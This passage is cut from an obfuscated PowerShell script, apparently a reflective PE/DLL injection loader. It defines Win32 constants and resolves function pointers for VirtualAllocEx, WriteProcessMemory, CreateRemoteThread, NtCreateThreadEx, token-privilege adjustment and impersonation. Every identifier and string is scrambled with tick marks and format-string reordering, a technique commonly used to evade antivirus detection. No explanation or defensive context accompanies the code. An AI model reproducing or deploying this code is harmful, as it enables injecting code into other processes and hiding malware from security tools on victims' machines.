		${W`in`32`ConStAN`TS} | &("{0}{2}{1}"-f 'Ad','-Member','d') -MemberType ("{0}{2}{1}{3}"-f'No','oper','tePr','ty') -Name ("{2}{1}{0}"-f 'ELEASE','EM_R','M') -Value 0x8000
		${w`In32CO`NsTaNTs} | &("{1}{0}{2}"-f 'dd','A','-Member') -MemberType ("{1}{2}{0}{3}"-f'ro','N','oteP','perty') -Name ("{1}{0}{2}" -f 'ER','TOKEN_QU','Y') -Value 0x0008
		${w`I`N`32cOn`stAnts} | &("{2}{0}{1}{3}" -f 'M','emb','Add-','er') -MemberType ("{0}{1}{2}"-f'NoteP','rope','rty') -Name ("{1}{0}{2}{4}{3}" -f 'N_ADJUST_','TOKE','P','ILEGES','RIV') -Value 0x0020
		${WiN`3`2CON`st`AnTs} | &("{2}{1}{0}"-f'mber','e','Add-M') -MemberType ("{3}{2}{0}{1}"-f'e','rty','teProp','No') -Name ("{0}{4}{5}{1}{3}{2}"-f 'SE','EGE_','D','ENABLE','_PRI','VIL') -Value 0x2
		${WI`N32`cON`STaNTs} | &("{2}{0}{1}"-f'-M','ember','Add') -MemberType ("{3}{2}{1}{0}"-f'perty','o','r','NoteP') -Name ("{1}{4}{0}{2}{3}"-f '_','ER','NO_TO','KEN','ROR') -Value 0x3f0
		
		return ${Wi`N32Cons`T`A`NTs}
	}

	Function get-W`in32F`Un`CT`IoNs
	{
		${win`32fuNC`T`ions} = &("{2}{1}{0}{3}"-f'j','Ob','New-','ect') ("{1}{2}{0}{3}"-f'm.O','S','yste','bject')
		
		${Vi`Rtu`Al`All`ocAddR} = &("{2}{4}{3}{1}{0}"-f'cAddress','o','Ge','r','t-P') ("{2}{0}{1}{3}" -f'2.','dl','kernel3','l') ("{2}{1}{0}"-f'Alloc','ual','Virt')
		${v`IR`TuAl`ALLocdEL`eGatE} = &("{0}{1}{4}{3}{2}"-f 'G','et-','pe','egateTy','Del') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${V`irtUAL`AlLOc} =   (gi vaRIABlE:gMqK).vALUE::("{1}{4}{0}{3}{5}{2}" -f 'DelegateForFu','Ge','ter','nction','t','Poin').Invoke(${virtuala`l`locaD`dr}, ${vIR`TuALalLO`c`de`LEG`A`TE})
		${wIN32`F`UNcti`oNs} | &("{1}{3}{2}{0}" -f 'er','Add-M','mb','e') ("{2}{0}{3}{1}" -f'teP','y','No','ropert') -Name ("{0}{1}{2}" -f'VirtualA','ll','oc') -Value ${ViRtUaL`AL`LOC}
		
		${vIrTu`ALALL`oC`eXADdr} = &("{1}{2}{3}{0}{4}"-f'Addre','G','et-P','roc','ss') ("{0}{1}{3}{2}"-f'k','er','ll','nel32.d') ("{0}{3}{1}{4}{2}" -f 'Virtua','l','Ex','lAl','oc')
		${VIrtUal`ALlOCEX`d`eL`Egate} = &("{0}{3}{4}{2}{1}" -f 'G','Type','legate','et-D','e') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${Virt`U`ALalLoC`EX} =   ${G`MQk}::("{5}{4}{2}{7}{0}{1}{3}{6}{8}" -f'un','c','t','t','ega','GetDel','ion','eForF','Pointer').Invoke(${v`IR`TU`ALaLl`o`ceX`ADDR}, ${VIR`Tu`AlAL`LoceX`DelEGAte})
		${WIN3`2`FuNctIo`Ns} | &("{0}{1}{2}"-f 'Add-Me','mbe','r') ("{0}{1}{2}{3}"-f'N','ot','ePropert','y') -Name ("{0}{1}{3}{2}"-f 'Vi','r','llocEx','tualA') -Value ${VIrT`UAla`LLOCeX}
		
		${M`eMcP`YAdDr} = &("{0}{1}{2}{3}"-f 'Get-ProcA','dd','r','ess') ("{0}{1}{2}{3}"-f'm','svcrt.','dl','l') ("{0}{1}"-f 'm','emcpy')
		${mEmCP`yDE`l`egATE} = &("{3}{1}{2}{0}" -f'pe','et-Dele','gateTy','G') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${m`EMCPY} =   ${g`mqk}::("{6}{4}{1}{5}{7}{2}{3}{0}"-f 'onPointer','Delegate','c','ti','t','Fo','Ge','rFun').Invoke(${mEm`CP`y`ADdR}, ${mem`cPy`dELEGA`TE})
		${Win`32`Fu`NctIo`Ns} | &("{0}{1}{2}" -f'Ad','d-Mem','ber') -MemberType ("{2}{3}{1}{0}"-f'erty','p','N','otePro') -Name ("{1}{0}"-f'cpy','mem') -Value ${Me`M`cpy}
		
		${MEm`SE`TADDR} = &("{0}{1}{3}{4}{2}" -f'Ge','t-Proc','ss','Add','re') ("{0}{1}{2}" -f 'msvcrt','.','dll') ("{1}{2}{0}"-f'et','mem','s')
		${mEmSe`T`d`eLe`gAtE} = &("{2}{4}{0}{1}{3}"-f'a','teTy','Get-Del','pe','eg') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${m`em`sEt} =  ( DIR VAriaBLE:GmQK ).VAlue::("{4}{6}{1}{8}{2}{0}{3}{5}{7}" -f 'nct','a','orFu','ionPoi','G','nt','etDeleg','er','teF').Invoke(${ME`MSE`T`Addr}, ${MEM`S`EtD`eleGatE})
		${w`in`32fUnCTIo`NS} | &("{1}{2}{0}"-f 'ber','Add-M','em') -MemberType ("{2}{3}{0}{1}"-f 'Prop','erty','No','te') -Name ("{2}{0}{1}" -f'se','t','mem') -Value ${M`EmSEt}
		
		${Loa`dlIbrA`R`YA`DDR} = &("{1}{0}{2}{3}"-f 'Addr','Get-Proc','es','s') ("{3}{1}{2}{0}"-f 'l','3','2.dl','kernel') ("{0}{2}{3}{1}" -f 'L','braryA','oa','dLi')
		${loAdliBr`ARY`del`e`G`ATE} = &("{2}{4}{3}{1}{0}" -f 'pe','DelegateTy','G','t-','e') @([String]) ([IntPtr])
		${LoA`DLI`BrA`RY} =  ${GM`qk}::("{5}{6}{1}{7}{0}{2}{4}{3}" -f'n','teForFuncti','Poi','er','nt','GetDele','ga','o').Invoke(${L`oaD`LIbRAR`YA`dDR}, ${LOAdlI`B`Raryde`leG`AtE})
		${W`IN32fUn`cTio`NS} | &("{1}{2}{0}"-f 'r','Ad','d-Membe') -MemberType ("{1}{2}{3}{0}"-f'Property','No','t','e') -Name ("{1}{0}{2}"-f'ib','LoadL','rary') -Value ${lOAD`l`IB`Rary}
		
		${G`E`TPRocAd`d`RE`SSaDdR} = &("{3}{1}{4}{0}{2}" -f 'roc','-','Address','Get','P') ("{0}{1}{3}{2}" -f 'kernel','32','dll','.') ("{1}{3}{0}{2}" -f 'ocAddr','G','ess','etPr')
		${GETp`ROcaD`dresSd`E`LeGatE} = &("{0}{1}{2}{3}"-f'Get-Delega','teT','yp','e') @([IntPtr], [String]) ([IntPtr])
		${Ge`T`ProcaD`d`RESs} =  (  Get-vARIaBle ('GmQ'+'K')  -VAL )::("{1}{3}{2}{4}{0}{5}" -f'nt','GetDelega','eForFu','t','nctionPoi','er').Invoke(${g`E`TP`Ro`CaDDrESsAD`dR}, ${gETP`Rocad`Dr`ES`SDel`egA`Te})
		${W`in3`2`FunctI`ONS} | &("{3}{2}{1}{0}" -f'er','b','d-Mem','Ad') -MemberType ("{1}{0}{2}" -f'p','NotePro','erty') -Name ("{0}{2}{3}{1}"-f 'GetPr','s','ocA','ddres') -Value ${GE`TPr`ocA`ddR`ess}
		
		${get`p`R`o`Ca`d`d`ReSSINtpTraDDr} = &("{4}{0}{2}{1}{3}" -f't','Addre','-Proc','ss','Ge') ("{3}{2}{1}{0}"-f '32.dll','nel','er','k') ("{2}{1}{0}{3}"-f 'P','t','Ge','rocAddress') 
		${G`EtPRoca`DdRESsi`N`TPT`Rdel`EGAte} = &("{0}{1}{2}{3}{4}" -f 'Get-Del','ega','teT','yp','e') @([IntPtr], [IntPtr]) ([IntPtr])
		${g`E`Tpr`ocADDR`eSS`INtPtR} =   ${gM`qk}::("{5}{3}{4}{1}{2}{6}{0}" -f'ointer','orFuncti','on','Deleg','ateF','Get','P').Invoke(${GetPRO`CAd`drEsS`INt`pT`R`A`dDr}, ${get`pRoCAd`d`ReSsI`Nt`PTRdeLeG`Ate})
		${w`in`32fuNcT`ioNS} | &("{1}{2}{0}" -f 'er','Add-Me','mb') -MemberType ("{3}{0}{2}{1}"-f 'eProp','rty','e','Not') -Name ("{1}{0}{2}{3}" -f'Ad','GetProc','dressIn','tPtr') -Value ${ge`T`PR`OcADdrEsSINTP`TR}
		
		${vI`Rtu`Al`FReeA`DDR} = &("{2}{0}{1}{4}{3}"-f'P','roc','Get-','ess','Addr') ("{1}{2}{0}" -f 'll','ke','rnel32.d') ("{2}{0}{1}" -f 't','ualFree','Vir')
		${VI`RTu`A`LFreEDeLE`g`ATe} = &("{1}{4}{0}{2}{3}" -f'gateTy','G','p','e','et-Dele') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${vIR`Tua`lf`REe} =  (  dIr ('V'+'ArI'+'AB'+'le:gMQk') ).value::("{1}{5}{0}{7}{6}{4}{2}{3}"-f'D','Ge','t','er','Poin','t','egateForFunction','el').Invoke(${v`I`RtuAlFRE`ea`D`dR}, ${vIrTu`Al`FRE`edEL`EG`Ate})
		${wiN`32f`UncT`IONS} | &("{3}{2}{1}{0}" -f'r','mbe','e','Add-M') ("{1}{2}{0}" -f'perty','Not','ePro') -Name ("{1}{0}{3}{2}" -f'ualF','Virt','e','re') -Value ${VIr`TUAlFR`ee}
		
		${VIRt`UaLFrEE`e`X`AddR} = &("{0}{2}{1}{3}"-f'Get-Proc','dre','Ad','ss') ("{1}{3}{2}{0}" -f'el32.dll','k','rn','e') ("{4}{2}{3}{1}{0}" -f'eEx','lFre','t','ua','Vir')
		${V`irT`U`AL`FreE`EXDEl`eGatE} = &("{0}{1}{2}" -f'Ge','t-Deleg','ateType') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${VirtUalf`R`Eeex} =  (get-Item ('V'+'ar'+'iabLe:g'+'mqk')).VaLue::("{7}{0}{3}{5}{2}{1}{4}{6}"-f't','ForFu','ate','Del','nctionPoint','eg','er','Ge').Invoke(${VIRt`U`ALf`Reeexa`dDr}, ${ViRT`U`A`lfreeexD`e`lEGate})
		${wiN32fUn`c`TIOns} | &("{0}{2}{1}"-f 'A','mber','dd-Me') ("{3}{2}{0}{1}"-f 'tePr','operty','o','N') -Name ("{1}{2}{0}" -f 'Ex','Virtual','Free') -Value ${vIRTu`ALF`Re`eEx}
		
		${VIr`TuAlprOt`e`CtA`ddr} = &("{1}{0}{2}" -f 't-','Ge','ProcAddress') ("{1}{0}{3}{2}"-f 'ern','k','2.dll','el3') ("{1}{0}{4}{3}{2}" -f'i','V','otect','Pr','rtual')
		${vi`R`TUalproT`eCT`Dele`GaTE} = &("{3}{0}{2}{1}"-f 'e','ype','T','Get-Delegat') @([IntPtr], [UIntPtr], [UInt32],  (geT-vaRIabLe ("1zf"+"By")  -valuEOn ).("{0}{3}{2}{1}" -f'Mak','ype','fT','eByRe').Invoke()) ([Bool])
		${virtu`Alp`RoTecT} =   (gEt-variAbLE  gMQk).VALUE::("{0}{4}{2}{1}{6}{3}{5}"-f 'GetDel','r','teFo','tionPointe','ega','r','Func').Invoke(${vir`Tual`pR`oTecTAddr}, ${vI`RtU`AL`pRot`eC`TD`elEgAte})
		${W`I`N32fU`Nc`TiONs} | &("{1}{2}{0}{3}" -f 'm','A','dd-Me','ber') ("{2}{1}{0}"-f 'roperty','oteP','N') -Name ("{0}{2}{1}"-f 'Vi','lProtect','rtua') -Value ${vi`RT`UA`lP`ROTect}
		
		${GetmOdulehaNd`l`eAd`dR} = &("{3}{2}{1}{4}{0}" -f'ess','oc','Pr','Get-','Addr') ("{0}{3}{1}{2}" -f 'ker','l32.d','ll','ne') ("{3}{2}{1}{0}" -f 'dleA','duleHan','o','GetM')
		${gEtModUl`eHAn`DL`EDE`LEGAte} = &("{1}{0}{4}{2}{3}" -f '-','Get','ate','Type','Deleg') @([String]) ([IntPtr])
		${g`EtmoDUL`EHAn`DLE} =  (  dIR varIABLE:GMQk ).VAlUe::("{1}{0}{3}{7}{5}{2}{6}{4}" -f 'gateFo','GetDele','oi','rFunc','ter','ionP','n','t').Invoke(${GEtM`oDU`LE`h`A`N`DLeAdDR}, ${gE`TMO`duLEhAnD`LeD`elEGaTe})
		${w`in3`2FuNcTiO`Ns} | &("{2}{0}{1}" -f 'dd-Mem','ber','A') ("{1}{3}{2}{0}" -f'operty','No','Pr','te') -Name ("{2}{1}{3}{0}{4}"-f 'd','l','GetModu','eHan','le') -Value ${gE`T`MOd`UlE`hANdlE}
		
		${free`Li`BRa`R`YAdDR} = &("{0}{3}{2}{1}" -f 'Get-Pr','s','Addres','oc') ("{3}{2}{1}{0}" -f 'l','l32.dl','erne','k') ("{0}{1}{2}" -f 'Fre','eLib','rary')
		${fReeLIBr`A`R`yDeLe`gaTE} = &("{0}{3}{2}{1}"-f'G','legateType','-De','et') @([Bool]) ([IntPtr])
		${f`Ree`LIBrArY} =  ( variablE ("g"+"MQK")).vAlue::("{2}{0}{6}{7}{8}{3}{1}{5}{4}"-f't','u','Ge','eForF','ctionPointer','n','Del','ega','t').Invoke(${fREe`LibRA`RyAd`DR}, ${Fr`EeLI`BR`ARYd`eLeG`AtE})
		${W`I`N32fuNcT`iONS} | &("{2}{0}{1}" -f'em','ber','Add-M') -MemberType ("{2}{1}{0}{3}"-f'e','op','NotePr','rty') -Name ("{2}{0}{1}"-f 'ra','ry','FreeLib') -Value ${fr`EEL`ibrA`RY}
		
		${OPEnPrO`CES`SaDdr} = &("{0}{1}{3}{2}" -f'Get-P','ro','ddress','cA') ("{0}{1}{2}"-f'kern','el','32.dll') ("{1}{2}{0}" -f'ss','O','penProce')
	    ${OpENp`RoCESsd`eLE`gaTE} = &("{3}{1}{0}{2}" -f'y','egateT','pe','Get-Del') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${o`Pe`NPrOcess} =   (  VARiAble gMqK ).valUE::("{4}{2}{6}{3}{0}{5}{7}{1}" -f'ionP','r','ga','ct','GetDele','o','teForFun','inte').Invoke(${Op`en`pROces`saDDR}, ${O`pe`NproC`esSDel`ega`Te})
		${W`iN3`2fUnctIons} | &("{1}{0}{2}"-f 'embe','Add-M','r') -MemberType ("{0}{3}{1}{2}"-f 'NoteProp','r','ty','e') -Name ("{2}{3}{0}{1}" -f 'ce','ss','Open','Pro') -Value ${oP`EN`PrOcESS}
		
		${wAiTf`ORSi`NgL`EOBje`C`TadDR} = &("{1}{2}{3}{0}" -f 'Address','Ge','t-','Proc') ("{0}{2}{1}"-f'ker','32.dll','nel') ("{1}{2}{0}{3}" -f 'eObj','WaitFo','rSingl','ect')
	    ${w`AI`T`F`ORsING`leobjECt`DELE`GaTE} = &("{4}{0}{2}{3}{1}" -f't','teType','-Deleg','a','Ge') @([IntPtr], [UInt32]) ([UInt32])
	    ${WA`itfoRsi`N`Gl`eoBjeCT} =   ( gEt-iTem ('v'+'AriAbL'+'e'+':gmqK')  ).ValUe::("{4}{1}{5}{0}{2}{3}" -f 'c','gateFo','tionP','ointer','GetDele','rFun').Invoke(${W`AitfoRsInGlEObJ`E`cTA`ddR}, ${wAi`TFOrSin`gLeOb`ject`De`L`eg`ATe})
		${wi`N32FU`N`cT`ionS} | &("{0}{3}{1}{2}" -f 'Ad','mb','er','d-Me') -MemberType ("{1}{3}{2}{0}"-f'erty','No','eProp','t') -Name ("{3}{0}{2}{1}{6}{4}{5}" -f 'tFor','ing','S','Wai','je','ct','leOb') -Value ${WAITFO`RsInG`leObj`e`ct}
		
		${W`RITEPrOc`e`s`SmeMoRYa`ddr} = &("{4}{2}{0}{1}{3}"-f 'roc','Ad','P','dress','Get-') ("{0}{1}{3}{2}" -f'kerne','l3','ll','2.d') ("{2}{4}{3}{0}{1}" -f'ssMemo','ry','Wr','e','iteProc')
        ${WrITEPrO`c`Es`sMe`M`oR`yDElEgatE} = &("{1}{2}{0}{4}{3}"-f 'el','Ge','t-D','ateType','eg') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  (  VARIABLE  ("ZT8Xb"+"F")  -ValUeo  ).("{3}{1}{0}{2}" -f 'Typ','keByRef','e','Ma').Invoke()) ([Bool])
        ${WrIT`EPr`oC`Ess`mEMO`Ry} =  ${g`Mqk}::("{6}{0}{3}{4}{1}{5}{2}" -f 'De','eForFunctionPoi','ter','leg','at','n','Get').Invoke(${wrI`TePR`Oc`ess`mEMOr`yad`Dr}, ${w`Ritepr`oCe`ss`mEm`oRYDEl`EgAte})
		${W`In32Fu`N`CTiO`Ns} | &("{2}{1}{0}"-f 'er','b','Add-Mem') -MemberType ("{1}{2}{3}{0}" -f'perty','N','ot','ePro') -Name ("{1}{0}{2}{4}{3}" -f'c','WritePro','e','sMemory','s') -Value ${wr`ItEPro`C`eSsmeM`Ory}
		
		${R`Ea`DpRoCeSSmemo`R`Yaddr} = &("{1}{0}{2}"-f'et-','G','ProcAddress') ("{1}{3}{0}{2}" -f'l32.','ke','dll','rne') ("{0}{4}{2}{1}{3}"-f'Re','Mem','rocess','ory','adP')
        ${R`EAdp`R`OCES`S`m`e`MORydeLEgATe} = &("{3}{2}{0}{1}"-f 'gateT','ype','ele','Get-D') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   (CHILDitEm  ('V'+'aRI'+'abLe'+':zT'+'8xBf')).vALUE.("{0}{2}{1}"-f'Make','fType','ByRe').Invoke()) ([Bool])
        ${Re`Ad`prOce`SSmEmorY} =  (gET-VariAbLe gMQK -VaLuEO )::("{1}{3}{7}{2}{0}{4}{6}{5}"-f'rFunct','Get','gateFo','D','i','Pointer','on','ele').Invoke(${rEaDpRoCesSM`EMO`R`y`ADdR}, ${REAdP`R`oces`smemO`RydEl`eGa`Te})
		${Wi`N`32FU`Nct`Ions} | &("{0}{2}{1}"-f'Add','ember','-M') -MemberType ("{1}{2}{3}{0}" -f 'perty','Note','Pr','o') -Name ("{1}{0}{2}{3}" -f'eadProces','R','sMemor','y') -Value ${R`EaDpROcess`Me`M`ory}
		
		${cREat`Eremo`TeT`h`REa`daddr} = &("{2}{1}{0}{3}{4}"-f'Pro','-','Get','cA','ddress') ("{2}{1}{3}{0}" -f 'll','32','kernel','.d') ("{1}{2}{0}{3}" -f 'oteThrea','Creat','eRem','d')
        ${Cr`Eat`er`e`M`oTEth`ReaDdelegATe} = &("{3}{2}{0}{4}{1}" -f 'e','pe','t-Delegat','Ge','Ty') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${CRe`AterE`MOT`e`TH`ReAD} =  (DIr  VArIaBLE:gMQk).VaLUe::("{3}{5}{0}{7}{1}{8}{4}{2}{6}" -f 'orF','t','te','GetDelega','onPoin','teF','r','unc','i').Invoke(${C`REa`TERe`MOtethRea`D`ADDr}, ${CRe`AtE`REMOT`EThr`eaDd`ElEgaTe})
		${WiN32f`UnCT`I`O`NS} | &("{0}{2}{1}{3}" -f'A','d-Memb','d','er') -MemberType ("{0}{1}{2}"-f'No','tePr','operty') -Name ("{2}{0}{1}{3}" -f'teRem','ot','Crea','eThread') -Value ${creaTere`m`o`T`EtHREaD}
		
		${GEt`E`x`iTcodeTHReaDAD`dr} = &("{3}{2}{1}{0}"-f'dress','-ProcAd','t','Ge') ("{2}{0}{3}{1}" -f'e','l32.dll','k','rne') ("{2}{1}{3}{0}" -f 'ead','de','GetExitCo','Thr')
        ${G`eTexitcO`DET`Hre`Ad`d`ELEga`Te} = &("{3}{4}{0}{2}{1}" -f 't','e','eTyp','Get-D','elega') @([IntPtr],  (  GEt-vARIAbLe  RCyt2  ).Value.("{0}{3}{2}{1}"-f 'Mak','pe','fTy','eByRe').Invoke()) ([Bool])
        ${GETeXiTCo`d`etH`READ} =  (GI vARiablE:GmQk  ).valuE::("{3}{1}{7}{0}{8}{5}{2}{6}{4}"-f'egateF','etD','nctionPo','G','ter','Fu','in','el','or').Invoke(${getEx`I`TC`O`d`eTHreAdadDR}, ${GEtEXITCODE`Thread`de`l`e`gatE})
		${wI`N`32fu`NCtIoNS} | &("{1}{3}{2}{0}" -f 'er','A','Memb','dd-') -MemberType ("{0}{1}{2}" -f'NoteP','ropert','y') -Name ("{2}{4}{1}{3}{0}" -f'd','tCodeTh','G','rea','etExi') -Value ${g`ETeXITcod`e`THrEaD}
		
		${opENth`REA`DtOk`ENaDdR} = &("{2}{1}{3}{0}"-f 'dress','Pro','Get-','cAd') ("{1}{2}{0}"-f'2.dll','Adva','pi3') ("{0}{2}{1}" -f 'OpenThreadTok','n','e')
        ${OPe`NTh`Re`AdTokeNdE`LeG`ATe} = &("{1}{4}{2}{0}{3}{5}"-f 'a','Get-Del','g','te','e','Type') @([IntPtr], [UInt32], [Bool],  ${U8M`1sF}.("{2}{0}{1}" -f'eBy','RefType','Mak').Invoke()) ([Bool])
        ${o`pEnThr`E`AdtO`keN} =   ${GM`qk}::("{6}{5}{2}{1}{3}{4}{0}"-f 'er','n','Fu','ctionP','oint','tDelegateFor','Ge').Invoke(${OPENTHR`EAdT`O`keNa`DDR}, ${o`p`EntHr`Ea`dTOKEn`DELega`Te})
		${wiN32`Fu`NC`TiOnS} | &("{0}{1}{2}" -f 'A','dd-Mem','ber') -MemberType ("{3}{2}{0}{1}" -f 'Pr','operty','te','No') -Name ("{2}{0}{1}{3}" -f'penTh','readTok','O','en') -Value ${op`E`NthrEaD`ToKEn}
		
		${geTCUrreN`T`T`HR`eAdADdr} = &("{2}{1}{0}"-f'dress','Ad','Get-Proc') ("{1}{2}{0}"-f 'l32.dll','k','erne') ("{3}{0}{4}{2}{1}" -f'tCu','Thread','nt','Ge','rre')
        ${ge`TC`UrreNT`ThrEa`d`Del`egATE} = &("{0}{1}{3}{4}{2}" -f 'Get-De','lega','Type','t','e') @() ([IntPtr])
        ${GetcuR`REnT`T`hrEad} =  ( gEt-chiLdiTeM  VaRiaBlE:GMQk ).VaLUE::("{4}{5}{1}{6}{0}{2}{3}"-f'c','Fo','tionPo','inter','G','etDelegate','rFun').Invoke(${GeT`CURreNt`THr`e`Ad`AD`dR}, ${ge`TcU`R`RE`NT`TH`REadDe`leGaTE})
		${W`i`N32Fu`NctIONs} | &("{1}{0}{2}" -f'M','Add-','ember') -MemberType ("{1}{0}{2}" -f'p','NotePro','erty') -Name ("{1}{4}{3}{0}{2}" -f 'tThrea','Ge','d','n','tCurre') -Value ${Ge`T`cu`RReNtThReAD}
		
		${ad`JUSt`TOKenp`RIVI`LEGEs`Ad`DR} = &("{2}{0}{1}{3}{4}" -f't-P','rocAdd','Ge','r','ess') ("{1}{2}{0}"-f '32.dll','Ad','vapi') ("{0}{3}{5}{6}{4}{2}{1}"-f 'Ad','es','g','j','Privile','ustT','oken')
        ${A`DJuS`TTo`KEnprI`V`iLeGEsd`E`lEg`ATe} = &("{1}{2}{0}"-f 'teType','Get-','Delega') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${adjUSTtok`E`Np`R`I`V`iLeges} =   ( Get-vArIablE GMQk ).vAluE::("{1}{5}{7}{8}{3}{2}{6}{4}{0}" -f'r','GetDelegateFo','i','t','Pointe','r','on','F','unc').Invoke(${AdJU`sTTO`keNpri`VIl`e`gEsADdR}, ${adjus`T`TOkE`NPrIvILEgESd`el`EGAtE})
		${w`in32`FunC`TIO`NS} | &("{0}{1}{2}"-f 'Add-','Mem','ber') -MemberType ("{1}{0}{2}" -f 'tePropert','No','y') -Name ("{2}{0}{3}{4}{1}" -f 'o','ges','AdjustT','ke','nPrivile') -Value ${aDJU`S`TtoKEn`p`RI`V`IleGES}
		
		${lOOkUpPRIVi`leg`EvA`lUeAd`dr} = &("{1}{4}{0}{3}{2}" -f'd','Get','ess','r','-ProcAd') ("{0}{2}{1}"-f'A','.dll','dvapi32') ("{5}{4}{3}{0}{2}{1}{6}"-f 'ile','e','geValu','upPriv','ok','Lo','A')
        ${LOokuppr`ivIL`Eg`EVa`lUEdEL`Eg`A`Te} = &("{0}{2}{1}" -f'G','ype','et-DelegateT') @([String], [String], [IntPtr]) ([Bool])
        ${lOOk`UP`PRIVi`l`egeVa`Lue} =   (cHIlDiTEm VaRiAbLE:gMqk ).VAlUe::("{2}{0}{1}{3}{5}{6}{4}" -f'DelegateForF','un','Get','c','er','tionPo','int').Invoke(${LoOkuPp`RI`V`iLEGEv`ALuEAddR}, ${LoOK`UPPrI`VI`L`Eg`EvaluEdel`ega`Te})
		${WIN3`2fUNct`I`oNs} | &("{0}{1}{2}"-f 'Add-','M','ember') -MemberType ("{2}{3}{1}{0}" -f'ty','er','Not','eProp') -Name ("{4}{1}{0}{3}{2}{5}"-f 'upPriv','ook','Val','ilege','L','ue') -Value ${lOO`KUpprIvIL`EgE`VaLUe}
		
		${i`mPErsonaTESel`FAd`dr} = &("{1}{2}{3}{0}" -f 'dress','Get-P','ro','cAd') ("{2}{1}{0}"-f 'dll','pi32.','Adva') ("{1}{0}{2}{3}{4}" -f 'a','Imperson','teS','e','lf')
        ${I`MpeRs`O`NATEselfDEl`Eg`A`Te} = &("{2}{3}{4}{1}{0}" -f 'e','yp','Get','-De','legateT') @([Int32]) ([Bool])
        ${Im`PeRSona`Tes`eLf} =  ${gM`QK}::("{4}{5}{6}{2}{3}{0}{7}{8}{1}" -f'ncti','inter','r','Fu','Ge','tDelega','teFo','onP','o').Invoke(${IMPErSoN`ATE`s`ELfaddR}, ${Im`p`E`RSona`TeSeL`Fd`EleGate})
		${win`32FU`NcT`I`ONs} | &("{3}{0}{2}{1}" -f'd-','ber','Mem','Ad') -MemberType ("{2}{3}{0}{1}" -f'pe','rty','N','otePro') -Name ("{1}{3}{2}{0}" -f 'nateSelf','I','so','mper') -Value ${im`PeRson`A`TeS`elF}
		
		${N`T`CRE`AtetHReAD`EXA`ddr} = &("{2}{1}{0}{3}"-f'dr','-ProcAd','Get','ess') ("{0}{1}{2}"-f 'Nt','Dll.','dll') ("{0}{1}{3}{2}"-f'NtCreateT','h','eadEx','r')
        ${nTcR`e`A`Te`THReaDexdEl`eG`ATE} = &("{1}{4}{0}{3}{2}"-f'Deleg','Get','teType','a','-') @( ( Get-VARiaBLE ('u8'+'m1s'+'F')  -VA ).("{0}{3}{2}{1}" -f 'MakeByR','e','p','efTy').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        ${nTC`Re`ATET`hREAdeX} =  (  gcI  VaRiabLe:GmqK  ).valUe::("{2}{6}{5}{0}{4}{3}{1}" -f 'egateForFunctio','r','Get','inte','nPo','el','D').Invoke(${NTCR`E`AT`Et`HrEadExadDr}, ${n`TcR`eatE`ThrE`ADeXDe`lE`gaTE})
		${wI`N32Fu`NC`TioNS} | &("{2}{1}{0}" -f'Member','d-','Ad') -MemberType ("{2}{0}{1}"-f 'tePro','perty','No') -Name ("{1}{2}{4}{3}{0}"-f 'Ex','N','tCreateT','ead','hr') -Value ${NT`CReAT`eT`hREa`deX}
		
		${i`sWOw64PRO`CEs`Sad`dr} = &("{2}{3}{1}{0}{4}"-f'-ProcAd','t','G','e','dress') ("{2}{1}{0}" -f'l32.dll','rne','Ke') ("{1}{2}{0}"-f'rocess','IsWow64','P')
        ${I`sWo`w64proCES`S`DELEGatE} = &("{0}{2}{1}{4}{3}"-f'G','t','et-Delega','pe','eTy') @([IntPtr],   (gEt-chiLditeM VaRIable:76WR).vAluE.("{2}{0}{1}" -f 'akeByRefTy','pe','M').Invoke()) ([Bool])
        ${I`S`Wow6`4PrOCess} =  (  GET-VARIABLe  ("g"+"MqK")  ).VAlUe::("{1}{2}{3}{4}{0}{5}"-f'nPoi','G','etDele','ga','teForFunctio','nter').Invoke(${ISWoW64pro`CESs`AD`DR}, ${i`S`wo`w64pr`o`cEs`s`DELEGate})
		${WIN`32fu`N`Ct`IOns} | &("{2}{1}{0}{3}"-f 'b','-Mem','Add','er') -MemberType ("{0}{1}{3}{2}"-f 'N','o','perty','tePro') -Name ("{1}{0}{3}{2}"-f '4Proce','IsWow6','s','s') -Value ${IsWOw`64`pR`oCEss}
		
		${cRe`AT`eThr`Ea`D`AdDR} = &("{1}{2}{0}{3}{4}"-f'Add','Get-Pro','c','r','ess') ("{3}{1}{2}{0}" -f '.dll','erne','l32','K') ("{0}{3}{2}{1}" -f 'Creat','d','Threa','e')
        ${creatET`HrEa`d`dELegATE} = &("{2}{3}{1}{0}" -f 'legateType','De','Ge','t-') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   (  VaRiABlE 1zFBy  -vaLueON  ).("{2}{3}{1}{0}"-f 'ype','yRefT','M','akeB').Invoke()) ([IntPtr])
        ${Cr`eA`TeThr`EAD} =   (VArIABle  GmQk ).valUe::("{7}{2}{4}{5}{0}{6}{3}{1}" -f 'u','er','etDeleg','nt','a','teForF','nctionPoi','G').Invoke(${Cr`EAteThr`ea`D`AD`Dr}, ${cr`EaTEtHREadD`eL`eGate})
		${W`i`N3`2fUNCTiO`Ns} | &("{0}{3}{1}{2}" -f'Ad','-Mem','ber','d') -MemberType ("{0}{1}{2}{3}"-f 'N','oteProper','t','y') -Name ("{3}{2}{1}{0}"-f'ead','hr','eateT','Cr') -Value ${cr`EAT`e`ThR`EAd}
		
		return ${wiN3`2`FUnctioNS}
	}
	

			
	
	
	

	
	
	Function sUB-sI`gned`iNTa`S`UN`sig`NED
	{
		Param(
		[Parameter(POsItioN = 0, MaNdaTOrY = ${TR`Ue})]
		[Int64]
		${V`AlU`E1},
		
		[Parameter(PoSiTION = 1, mAnDAtorY = ${tR`Ue})]
		[Int64]
		${V`AL`Ue2}
		)
		
